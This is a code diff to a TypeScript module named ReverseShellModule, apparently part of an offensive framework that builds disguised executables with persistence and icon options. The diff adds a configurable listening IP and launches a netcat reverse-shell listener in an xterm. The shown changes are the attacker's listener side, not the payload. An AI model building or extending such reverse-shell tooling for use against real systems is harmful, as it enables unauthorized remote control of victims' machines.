@@ -5,6 +5,7 @@ import {
 import { createIco } from 'create-ico';
 import fs from 'fs';
 import isImage from 'is-image';
+import net from 'net';
 import path from 'path';
 
 import { Module } from '../../classes/Module';
@@ -24,7 +25,7 @@ export default class ReverseShellModule extends Module {
     isPersistent: 'true'|'false' = 'true';
     isFilesDependant: 'true'|'false' = 'false';
     mergeFilePath = '';
-    hostCmd = `nc -n 127.0.0.1 -l ${this.listenPort}`;
+    listenIp = '127.0.0.1';
     waitRun = 0;
     askAdmin: 'true' | 'false' = 'false';
     
@@ -38,6 +39,11 @@ export default class ReverseShellModule extends Module {
             arg: 'l_host=',
             desc: "Set listening host ip. Default is 10.0.2.2",
             handler: host => this.hostIp = host 
+        },
+        {
+            arg: 'listen_ip=',
+            desc: "The current ip to listen. Default is localhost",
+            handler: this.handleSetListenIp
         },
         {
             arg: 'exe_name=',
@@ -95,6 +101,14 @@ export default class ReverseShellModule extends Module {
             handler: this.handleListen
         }
     ]
+
+    handleSetListenIp(ip){
+        if(!net.isIPv4(ip)){
+            cmdWarn(`Error, invalid ip given: ${ip}`);
+            return;
+        }
+        this.listenIp = ip;
+    }
     
     handleSetPort(port){
         if(isNaN(Number(port))){
@@ -209,7 +223,7 @@ export default class ReverseShellModule extends Module {
 
     async handleListen() {
         // open terminal window with listener
-        spawn("xterm", ["-hold", "-e", this.hostCmd]);
+        spawn("xterm", ["-hold", "-e", `nc -n ${this.listenIp} -l ${this.listenPort}`]);
     }
 
     async handleSetIcon(inputIconPath: string){
